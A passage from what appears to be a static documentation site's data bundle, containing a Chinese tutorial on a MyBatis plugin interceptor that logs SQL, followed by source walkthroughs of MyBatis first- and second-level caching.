{\n                // 拦截 parameterhandler|resultsethandler|statementhandler|executor\n                if (signaturemap.containskey(c)) {\n                    interfaces.add(c);\n                }\n            }\n            type = type.getsuperclass();\n        }\n        return interfaces.toarray(new class<?>[interfaces.size()]);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n\n# 自定义\n\npackage cn.mybatis.test.plugin;\n\nimport cn.mybatis.executor.statement.statementhandler;\nimport cn.mybatis.mapping.boundsql;\nimport cn..mybatis.plugin.interceptor;\nimport cn.mybatis.plugin.intercepts;\nimport cn.mybatis.plugin.invocation;\nimport cn.mybatis.plugin.signature;\n\nimport java.sql.connection;\nimport java.util.properties;\n\n@intercepts({@signature(type = statementhandler.class, method = "prepare", args = {connection.class})})\npublic class testplugin implements interceptor {\n\n    @override\n    public object intercept(invocation invocation) throws throwable {\n        // 获取statementhandler\n        statementhandler statementhandler = (statementhandler) invocation.gettarget();\n        // 获取sql信息\n        boundsql boundsql = statementhandler.getboundsql();\n        string sql = boundsql.getsql();\n        // 输出sql\n        system.out.println("拦截sql：" + sql);\n        // 放行\n        return invocation.proceed();\n    }\n\n    @override\n    public void setproperties(properties properties) {\n        system.out.println("参数输出：" + properties.getproperty("test00"));\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',charsets:{cjk:!0}},{title:"核心功能拆解 一二级缓存原理",frontmatter:{title:"核心功能拆解 一二级缓存原理",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/302/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/30.Mybatis/31.mybatis/302.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E5%8E%9F%E7%90%86.html",relativePath:"00.java/30.Mybatis/31.mybatis/302.核心功能拆解 一二级缓存原理.md",key:"v-2504457e",path:"/mybatis/mybatis/302/",headers:[{level:2,title:"一级缓存",slug:"一级缓存",normalizedTitle:"一级缓存",charIndex:13},{level:3,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:292},{level:3,title:"准备",slug:"准备",normalizedTitle:"准备",charIndex:1240},{level:3,title:"执行",slug:"执行",normalizedTitle:"执行",charIndex:1271},{level:2,title:"二级缓存",slug:"二级缓存",normalizedTitle:"二级缓存",charIndex:18},{level:3,title:"解析",slug:"解析-2",normalizedTitle:"解析",charIndex:292},{level:2,title:"准备",slug:"准备-2",normalizedTitle:"准备",charIndex:1240},{level:2,title:"执行",slug:"执行-2",normalizedTitle:"执行",charIndex:1271}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"一级缓存 解析 准备 执行 二级缓存 解析 准备 执行",content:'MyBatis 的缓存分为一级缓存和二级缓存，缓存情况如下图，单服务架构中（有且仅有只有一个程序提供相同服务），一级缓存开启不会影响业务，只会提高性能。 微服务架构中需要关闭一级缓存，原因：Service1 先查询数据，若之后 Service2 修改了数据，之后 Service1 又再次以同样的查询条件查询数据，因走缓存会出现查处的数据不是最新数据\n\n\n\n\n# 一级缓存\n\n一级缓存是基于 SQLSession 级别的，在同一个 Session 的相同查询语句会才会从缓存中查询，所谓相同包括 SQL 相同，条件相同等，那么我们看下在源码中具体是怎么维护和使用这个缓存的。\n\n\n# 解析\n\n描述一级缓存只需要在 <configuration> 标签中描述即可，而一级缓存的 value 值有 SESSION 和 STATEMENT 两种，如果设置为 STATEMENT 基本可以算是关闭一级缓存，一级缓存是 MyBatis 提供的默认缓存，所以不会在代码中看到判断一级缓存的条件\n\n<configuration>\n    <settings>\n        \x3c!--缓存级别：SESSION/STATEMENT--\x3e\n        <setting name="localCacheScope" value="SESSION"/>\n    </settings>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\n解析核心代码会得到 localCacheScope的值 ，维护到 configuration 全局配置中\n\nprivate void settingsElement(Element context) {\n    if (context == null) return;\n    List<Element> elements = context.elements();\n    Properties props = new Properties();\n    for (Element element : elements) {\n        props.setProperty(element.attributeValue("name"), element.attributeValue("value"));\n    }\n    // 是否启用二级缓存\n    configuration.setCacheEnabled(booleanValueOf(props.getProperty("cacheEnabled"), true));\n    // 一级缓存的配置\n    configuration.setLocalCacheScope(LocalCacheScope.valueOf(props.getProperty("localCacheScope")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 准备\n\n准备阶段主要是在 openSession 方法，他会在执行器里面去直接 new PerpetualCache 永久缓存，执行器就拥有了这个缓存对象\n\n// 打开一个 session\n@Override\npublic SqlSession openSession() {\n    Transaction tx = null;\n    try {\n        final Environment environment = configuration.getEnvironment();\n        TransactionFactory transactionFactory = environment.getTransactionFactory();\n        tx = transactionFactory.newTransaction(configuration.getEnvironment().getDataSource(), TransactionIsolationLevel.READ_COMMITTED, false);\n        // 创建执行器\n        final Executor executor = configuration.newExecutor(tx);\n        // 创建DefaultSqlSession\n        return new DefaultSqlSession(configuration, executor);\n    } catch (Exception e) {\n        try {\n            assert tx != null;\n            tx.close();\n        } catch (SQLException ignore) {\n        }\n        throw new RuntimeException("Error opening session.  Cause: " + e);\n    }\n}\n\n// 创建执行器\npublic Executor newExecutor(Transaction transaction) {\n    Executor executor = new SimpleExecutor(this, transaction);\n    // 配置开启二级缓存，创建 CachingExecutor(默认就是有缓存)装饰者模式，\n    if (cacheEnabled) {\n        executor = new CachingExecutor(executor);\n    }\n    return executor;\n}\n\n// SimpleExecutor 简单执行器的构造方法\npublic class SimpleExecutor extends BaseExecutor {\n    public SimpleExecutor(Configuration configuration, Transaction transaction) {\n        super(configuration, transaction);\n    }\n}\n\n// 基础执行器的构造方法\nprotected BaseExecutor(Configuration configuration, Transaction transaction) {\n    this.configuration = configuration;\n    this.transaction = transaction;\n    this.wrapper = this;\n    // new 一个永久缓存\n    this.localCache = new PerpetualCache("LocalCache");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\nPerpetualCache 继承了 Cache ，并实现了基本的对缓存的操作\n\npublic class PerpetualCache implements Cache {\n    private String id;\n    // 使用HashMap存放一级缓存数据，session 生命周期较短，正常情况下数据不会一直在缓存存放\n    private Map<Object, Object> cache = new HashMap<>();\n    public PerpetualCache(String id) {\n        this.id = id;\n    }\n    @Override\n    public String getId() {\n        return id;\n    }\n    @Override\n    public void putObject(Object key, Object value) {\n        cache.put(key, value);\n    }\n    @Override\n    public Object getObject(Object key) {\n        return cache.get(key);\n    }\n    @Override\n    public Object removeObject(Object key) {\n        return cache.remove(key);\n    }\n    @Override\n    public void clear() {\n        cache.clear();\n    }\n    @Override\n    public int getSize() {\n        return cache.size();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 执行\n\n在准备阶段已经得到了执行器，并在执行器里面得到了 PerpetualCache 缓存，只需要知道客户使用的是查询还是修改等操作后，执行执行器里面对应的 query or update 方法即可\n\npublic abstract class BaseExecutor implements Executor {\n\n    private org.slf4j.Logger logger = LoggerFactory.getLogger(BaseExecutor.class);\n\n    protected Configuration configuration;\n    protected Transaction transaction;\n    protected Executor wrapper;\n\n    // 本地缓存\n    protected PerpetualCache localCache;\n\n    private boolean closed;\n    // 查询堆栈\n    protected int queryStack = 0;\n\n    protected BaseExecutor(Configuration configuration, Transaction transaction) {\n        this.configuration = configuration;\n        this.transaction = transaction;\n        this.wrapper = this;\n        this.localCache = new PerpetualCache("LocalCache");\n    }\n\n    @Override\n    public int update(MappedStatement ms, Object parameter) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        clearLocalCache();\n        return doUpdate(ms, parameter);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException {\n        // 1. 获取绑定SQL\n        BoundSql boundSql = ms.getBoundSql(parameter);\n        // 2. 创建缓存Key\n        CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql);\n        return query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        // 清理局部缓存，查询堆栈为0则清理。queryStack 避免递归调用清理\n        if (queryStack == 0 && ms.isFlushCacheRequired()) {\n            clearLocalCache();\n        }\n        List<E> list;\n        try {\n            queryStack++;\n            // 根据cacheKey从localCache中查询数据\n            list = resultHandler == null ? (List<E>) localCache.getObject(key) : null;\n            if (list == null) {\n                list = queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);\n            }\n        } finally {\n            queryStack--;\n        }\n        if (queryStack == 0) {\n            if (configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) {\n                clearLocalCache();\n            }\n        }\n        return list;\n    }\n\n    private <E> List<E> queryFromDatabase(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        List<E> list;\n        localCache.putObject(key, ExecutionPlaceholder.EXECUTION_PLACEHOLDER);\n        try {\n            list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql);\n        } finally {\n            localCache.removeObject(key);\n        }\n        // 存入缓存\n        localCache.putObject(key, list);\n        return list;\n    }\n\n    protected abstract int doUpdate(MappedStatement ms, Object parameter) throws SQLException;\n\n    protected abstract <E> List<E> doQuery(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) throws SQLException;\n\n    @Override\n    public Transaction getTransaction() {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        return transaction;\n    }\n\n    @Override\n    public void commit(boolean required) throws SQLException {\n        if (closed) {\n            throw new RuntimeException("Cannot commit, transaction is already closed");\n        }\n        clearLocalCache();\n        if (required) {\n            transaction.commit();\n        }\n    }\n\n    @Override\n    public void rollback(boolean required) throws SQLException {\n        if (!closed) {\n            try {\n                clearLocalCache();\n            } finally {\n                if (required) {\n                    transaction.rollback();\n                }\n            }\n        }\n    }\n\n    @Override\n    public void clearLocalCache() {\n        if (!closed) {\n            localCache.clear();\n        }\n    }\n\n    @Override\n    public CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) {\n        if (closed) {\n            throw new RuntimeException("Executor was closed.");\n        }\n        CacheKey cacheKey = new CacheKey();\n        cacheKey.update(ms.getId());\n        cacheKey.update(rowBounds.getOffset());\n        cacheKey.update(rowBounds.getLimit());\n        cacheKey.update(boundSql.getSql());\n        List<ParameterMapping> parameterMappings = boundSql.getParameterMappings();\n        TypeHandlerRegistry typeHandlerRegistry = ms.getConfiguration().getTypeHandlerRegistry();\n        for (ParameterMapping parameterMapping : parameterMappings) {\n            Object value;\n            String propertyName = parameterMapping.getProperty();\n            if (boundSql.hasAdditionalParameter(propertyName)) {\n                value = boundSql.getAdditionalParameter(propertyName);\n            } else if (parameterObject == null) {\n                value = null;\n            } else if (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) {\n                value = parameterObject;\n            } else {\n                MetaObject metaObject = configuration.newMetaObject(parameterObject);\n                value = metaObject.getValue(propertyName);\n            }\n            cacheKey.update(value);\n        }\n        if (configuration.getEnvironment() != null) {\n            cacheKey.update(configuration.getEnvironment().getId());\n        }\n        return cacheKey;\n    }\n\n    @Override\n    public void setExecutorWrapper(Executor executor) {\n        this.wrapper = wrapper;\n    }\n\n    @Override\n    public void close(boolean forceRollback) {\n        try {\n            try {\n                rollback(forceRollback);\n            } finally {\n                transaction.close();\n            }\n        } catch (SQLException e) {\n            logger.warn("Unexpected exception on closing transaction.  Cause: " + e);\n        } finally {\n            transaction = null;\n            localCache = null;\n            closed = true;\n        }\n    }\n\n    protected void closeStatement(Statement statement) {\n        if (statement != null) {\n            try {\n                statement.close();\n            } catch (SQLException ignore) {\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n\n\n可以看到 执行器里面维护了 query update commit 等方法，在执行查询的时候会先生成 CacheKey ，会按照 namespace.id + 分页offset + 分页limit + 执行的SQL语句 + 查询条件的值 + 环境ID 生成唯一的 key，然后做为查询缓存的 key，查询结果做为 value，如果同一各 SQLSession 执行相同语句和条件以及分页等，就会从缓存中命中并返回结果。缓存的清除，就是当该 SQLSession 执行 update，commit，close，rollback 时该 SQLSession 就清除缓存。\n\n在 SQL 语句中也可以设置清除缓存，只需要在 <select>、<insert> 和 <update> 等 SQL 标签中设置 flushCache="true" 属性会强制清空本地缓存，使得下次查询时重新从数据库中获取数据。适用于一级缓存和二级缓存\n\n<select id="selectById" resultType="com.example.User" flushCache="true">\n  select * from user where id = #{id}\n</select>\n\n\n1\n2\n3\n\n\n\n# 二级缓存\n\n二级缓存是为 Namespace 也叫 mapper 级别的缓存，是跨 SQLSession 的，他会在原有的执行器上封装一个 CachingExecutor ，来管理缓存， CachingExecutor 使用了装饰器模式来装饰基础的 Executor 执行器。\n\n\n# 解析\n\n在二级缓存中的配置方式具体如下\n\n\x3c!-- 必须先开启缓存 --\x3e\n<configuration>\n    <settings>\n        \x3c!--  true/false 二级缓存是否使用 --\x3e\n        <setting name="cacheEnabled" value="true"/>\n    </settings>\n</configuration>\n\n\x3c!-- 指定在某个mapper中使用 --\x3e\n<mapper namespace="com.example.MyMapper">\n    \x3c!-- 设置该mapper的二级缓存 --\x3e\n    <cache eviction="LRU" flushInterval="100000" readOnly="true" size="1024"/>\n    \x3c!-- useCache：表示是否使用二级缓存，如果设置为 true，则会使用二级缓存。对于 select 元素，默认值为 true。 --\x3e\n    \x3c!-- useCache 属性只能控制是否使用二级缓存，它不能关闭一级缓存。一级缓存是 MyBatis 的默认行为，它总是开启的，无法关闭。 --\x3e\n    <select id="queryActivityById" parameterType="cn.bugstack.mybatis.test.po.Activity" flushCache="false" useCache="true">\n        SELECT activity_id, activity_name, activity_desc, create_time, update_time\n        FROM activity\n        <trim prefix="where" prefixOverrides="AND | OR" suffixOverrides="and">\n            <if test="null != activityId">\n                activity_id = #{activityId}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n其中 <cache > 标签有多个属性，这里一一介绍一下：\n\n * type：可以指定自定义缓存，但是该类必须实现，而且是全类名\n * eviction：缓存回收策略，默认为 LRU（Least Recently Used），策略介绍如下：\n   LRU：按照访问时间排序，最近未使用的数据优先清除。\n   FIFO：按照插入时间排序，先插入的数据先清除。\n   SOFT：基于垃圾回收算法，当系统内存不足时，会优先清理不常用的、占用内存较多的数据。\n   WEAK：弱引用机制，当 JVM 进行垃圾回收时，如果判断一个对象只被弱引用指向，则会将其回收。\n * flushInterval：刷新间隔时间，表示多长时间刷新一次缓存，单位为毫秒，默认不刷新。\n * size：缓存的大小，表示最多可以缓存多少个对象。\n * readOnly：是否只读，默认为 false，表示启用缓存更新机制。\n * blocking：是否启用阻塞，默认为 false，表示不启用。\n\n> flushInterval 默认情况下，MyBatis 采用基于 PerpetualCache (永久缓存) 的缓存实现方式，即缓存会一直保存在内存中，直到会话关闭时才被清除。而当我们使用基于 Ehcache 的缓存实现时，可以通过设置 flushInterval 属性控制缓存的刷新时间，即定时将缓存中的数据写入到磁盘或持久化存储中，以避免缓存过期、失效或内存溢出等问题。\n\n当 Mybaits 启动后会读到二级缓存的配置，先会进行 <cache> 基础的解析，得到 XML 里面的属性值，其次用值信息组成一个 Cache 对象，并把这个 Cache 对象维护到全局配置 Configuration 中，该全局配置里面是维护一个 Map 结构的容器\n\n// 开始解析\nprivate void cacheElement(Element context) {\n    if (context == null) return;\n    // 基础配置信息，默认是永恒缓存\n    String type = context.attributeValue("type", "PERPETUAL");\n    Class<? extends Cache> typeClass = typeAliasRegistry.resolveAlias(type);\n    // 缓存队列 FIFO\n    String eviction = context.attributeValue("eviction", "FIFO");\n    Class<? extends Cache> evictionClass = typeAliasRegistry.resolveAlias(eviction);\n    Long flushInterval = Long.valueOf(context.attributeValue("flushInterval"));\n    Integer size = Integer.valueOf(context.attributeValue("size"));\n    boolean readWrite = !Boolean.parseBoolean(context.attributeValue("readOnly", "false"));\n    boolean blocking = !Boolean.parseBoolean(context.attributeValue("blocking", "false"));\n\n    // 解析额外属性信息；<property name="cacheFile" value="/tmp/xxx-cache.tmp"/>\n    List<Element> elements = context.elements();\n    Properties props = new Properties();\n    for (Element element : elements) {\n        props.setProperty(element.attributeValue("name"), element.attributeValue("value"));\n    }\n    // 构建缓存\n    builderAssistant.useNewCache(typeClass, evictionClass, flushInterval, size, readWrite, blocking, props);\n}\n\n// 构建Cache\npublic Cache useNewCache(Class<? extends Cache> typeClass,\n                        Class<? extends Cache> evictionClass,\n                        Long flushInterval,\n                        Integer size,\n                        boolean readWrite,\n                        boolean blocking,\n                        Properties props) {\n    // 判断为null，则用默认值\n    typeClass = valueOrDefault(typeClass, PerpetualCache.class);\n    evictionClass = valueOrDefault(evictionClass, FifoCache.class);\n\n    // 建造者模式构建 Cache [currentNamespace=cn.bugstack.mybatis.test.dao.IActivityDao]\n    Cache cache = new CacheBuilder(currentNamespace)\n            .implementation(typeClass)\n            .addDecorator(evictionClass)\n            .clearInterval(flushInterval)\n            .size(size)\n            .readWrite(readWrite)\n            .blocking(blocking)\n            .properties(props)\n            .build();\n\n    // 添加缓存\n    configuration.addCache(cache);\n    // 给自己维护一个 cache 以便后续 MappedStatement 用到\n    currentCache = cache;\n    return cache;\n}\n\n// 添加到 configuration全局配置维护的 caches中\npublic class Configuration {\n    // 缓存,存在Map里\n    protected final Map<String, Cache> caches = new HashMap<>();\n    public void addCache(Cache cache) {\n        caches.put(cache.getId(), cache);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n缓存解析过了，但是最主要的还是 <select> 标签着一些，标签上面描述了具体的缓存是否使用，缓存是否清除，所以还需要解析标签上的缓存信息，主要是 flushCache 和 useCache 这两个属性\n\n// 解析操作\npublic void parseStatementNode() {\n    String id = element.attributeValue("id");\n    // 参数类型\n    String parameterType = element.attributeValue("parameterType");\n    Class<?> parameterTypeClass = resolveAlias(parameterType);\n    // 外部应用 resultMap\n    String resultMap = element.attributeValue("resultMap");\n    // 结果类型\n    String resultType = element.attributeValue("resultType");\n    Class<?> resultTypeClass = resolveAlias(resultType);\n    // 获取命令类型(select|insert|update|delete)\n    String nodeName = element.getName();\n    SqlCommandType sqlCommandType = SqlCommandType.valueOf(nodeName.toUpperCase(Locale.ENGLISH));\n\n    boolean isSelect = sqlCommandType == SqlCommandType.SELECT;\n    boolean flushCache = Boolean.parseBoolean(element.attributeValue("flushCache", String.valueOf(!isSelect)));\n    boolean useCache = Boolean.parseBoolean(element.attributeValue("useCache", String.valueOf(isSelect)));\n\n    // 获取默认语言驱动器\n    Class<?> langClass = configuration.getLanguageRegistry().getDefaultDriverClass();\n    LanguageDriver langDriver = configuration.getLanguageRegistry().getDriver(langClass);\n\n    // 解析<selectKey> step-14 新增\n    processSelectKeyNodes(id, parameterTypeClass, langDriver);\n\n    // 解析成SqlSource，DynamicSqlSource/RawSqlSource\n    SqlSource sqlSource = langDriver.createSqlSource(configuration, element, parameterTypeClass);\n\n    // 属性标记【仅对 insert 有用】, MyBatis 会通过 getGeneratedKeys 或者通过 insert 语句的 selectKey 子元素设置它的值 step-14 新增\n    String keyProperty = element.attributeValue("keyProperty");\n\n    KeyGenerator keyGenerator = null;\n    String keyStatementId = id + SelectKeyGenerator.SELECT_KEY_SUFFIX;\n    keyStatementId = builderAssistant.applyCurrentNamespace(keyStatementId, true);\n\n    if (configuration.hasKeyGenerator(keyStatementId)) {\n        keyGenerator = configuration.getKeyGenerator(keyStatementId);\n    } else {\n        keyGenerator = configuration.isUseGeneratedKeys() && SqlCommandType.INSERT.equals(sqlCommandType) ? new Jdbc3KeyGenerator() : new NoKeyGenerator();\n    }\n    // 调用助手类\n    builderAssistant.addMappedStatement(id,\n            sqlSource,\n            sqlCommandType,\n            parameterTypeClass,\n            resultMap,\n            resultTypeClass,\n            flushCache,\n            useCache,\n            keyGenerator,\n            keyProperty,\n            langDriver);\n}\n\n// 把信息添加到 MappedStatement对象\npublic MappedStatement addMappedStatement(\n        String id,\n        SqlSource sqlSource,\n        SqlCommandType sqlCommandType,\n        Class<?> parameterType,\n        String resultMap,\n        Class<?> resultType,\n        boolean flushCache,\n        boolean useCache,\n        KeyGenerator keyGenerator,\n        String keyProperty,\n        LanguageDriver lang\n) {\n    // 给id加上namespace前缀：cn.bugstack.mybatis.test.dao.IUserDao.queryUserInfoById\n    id = applyCurrentNamespace(id, false);\n    //是否是select语句\n    boolean isSelect = sqlCommandType == SqlCommandType.SELECT;\n\n    MappedStatement.Builder statementBuilder = new MappedStatement.Builder(configuration, id, sqlCommandType, sqlSource, resultType);\n    statementBuilder.resource(resource);\n    statementBuilder.keyGenerator(keyGenerator);\n    statementBuilder.keyProperty(keyProperty);\n\n    // 结果映射，给 MappedStatement#resultMaps\n    setStatementResultMap(resultMap, resultType, statementBuilder);\n    // 维护缓存信息\n    setStatementCache(isSelect, flushCache, useCache, currentCache, statementBuilder);\n    MappedStatement statement = statementBuilder.build();\n    // 映射语句信息，建造完存放到配置项中\n    configuration.addMappedStatement(statement);\n    return statement;\n}\n\n// 给Statement添加缓存信息\nprivate void setStatementCache(\n        boolean isSelect,\n        boolean flushCache,\n        boolean useCache,\n        Cache cache,\n        MappedStatement.Builder statementBuilder) {\n    flushCache = valueOrDefault(flushCache, !isSelect);\n    useCache = valueOrDefault(useCache, isSelect);\n    statementBuilder.flushCacheRequired(flushCache);\n    statementBuilder.useCache(useCache);\n    statementBuilder.cache(cache);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n\n\n在具体的 addMappedStatement 的时候，可以看到会得到一个 MappedStatement 对象，该对象就是封装了 SQL 标签的所有信息，在 setStatementCache 方法中，不仅只把 flushCache和useCache 进行了设置，额外的还带有一个 cache ，该 cache 就是在调用 useNewCache 方法，内部赋值的 currentCache ，他们的方法是在同一个类中，因此可以使用。这样 MappedStatement 对象也就拥有了 <cache> 标签的能力，到此解析完毕\n\n\n# 准备\n\n和一级缓存一样，都是在 openSession 的时候去做实例化，但是不同的是，二级缓存会在一级缓存上进行一个装饰，并且首要会判断是否允许开启二级缓存。\n\nif (cacheEnabled) {\n    executor = new CachingExecutor(executor);\n}\n\n\n1\n2\n3\n\n\nCachingExecutor 接收 executor ，并对其进行包装，内部方法依然调用的是 BaseExecutor 的相关方法。 CachingExecutor 内部还维护了 TransactionalCacheManager 事务缓存管理器，该管理器内部维护 Map<Cache, TransactionalCache> ， TransactionalCache 内部又维护了 Cache 以及 entriesMissedInCache 和 entriesToAddOnCommit\n\n\n# 执行\n\npublic class CachingExecutor implements Executor {\n\n    private Logger logger = LoggerFactory.getLogger(CachingExecutor.class);\n    private Executor delegate;\n    // 事务缓存管理器\n    private TransactionalCacheManager tcm = new TransactionalCacheManager();\n\n    public CachingExecutor(Executor delegate) {\n        this.delegate = delegate;\n        delegate.setExecutorWrapper(this);\n    }\n\n    @Override\n    public int update(MappedStatement ms, Object parameter) throws SQLException {\n        return delegate.update(ms, parameter);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException {\n        Cache cache = ms.getCache();\n        if (cache != null) {\n            flushCacheIfRequired(ms);\n            if (ms.isUseCache() && resultHandler == null) {\n                @SuppressWarnings("unchecked")\n                List<E> list = (List<E>) tcm.getObject(cache, key);\n                if (list == null) {\n                    list = delegate.<E>query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n                    // cache：缓存队列实现类，FIFO\n                    // key：哈希值 [mappedStatementId + offset + limit + SQL + queryParams + environment]\n                    // list：查询的数据\n                    tcm.putObject(cache, key, list);\n                }\n                // 打印调试日志，记录二级缓存获取数据\n                if (logger.isDebugEnabled() && cache.getSize() > 0) {\n                    logger.debug("二级缓存：{}", JSON.toJSONString(list));\n                }\n                return list;\n            }\n        }\n        return delegate.<E>query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public <E> List<E> query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException {\n        // 1. 获取绑定SQL\n        BoundSql boundSql = ms.getBoundSql(parameter);\n        // 2. 创建缓存Key\n        CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql);\n        return query(ms, parameter, rowBounds, resultHandler, key, boundSql);\n    }\n\n    @Override\n    public Transaction getTransaction() {\n        return delegate.getTransaction();\n    }\n\n    @Override\n    public void commit(boolean required) throws SQLException {\n        delegate.commit(required);\n        tcm.commit();\n    }\n\n    @Override\n    public void rollback(boolean required) throws SQLException {\n        try {\n            delegate.rollback(required);\n        } finally {\n            if (required) {\n                tcm.rollback();\n            }\n        }\n    }\n\n    @Override\n    public void close(boolean forceRollback) {\n        try {\n            if (forceRollback) {\n                tcm.rollback();\n            } else {\n                tcm.commit();\n            }\n        } finally {\n            delegate.close(forceRollback);\n        }\n    }\n\n    @Override\n    public void clearLocalCache() {\n        delegate.clearLocalCache();\n    }\n\n    @Override\n    public CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) {\n        return delegate.createCacheKey(ms, parameterObject, rowBounds, boundSql);\n    }\n\n    @Override\n    public void setExecutorWrapper(Executor executor) {\n        throw new UnsupportedOperationException("This method should not be called");\n    }\n\n    private void flushCacheIfRequired(MappedStatement ms) {\n        Cache cache = ms.getCache();\n        if (cache != null && ms.isFlushCacheRequired()) {\n            tcm.clear(cache);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\npublic class TransactionalCacheManager {\n\n    private Map<Cache, TransactionalCache> transactionalCaches = new HashMap<>();\n\n    public void clear(Cache cache) {\n        getTransactionalCache(cache).clear();\n    }\n\n    /**\n     * 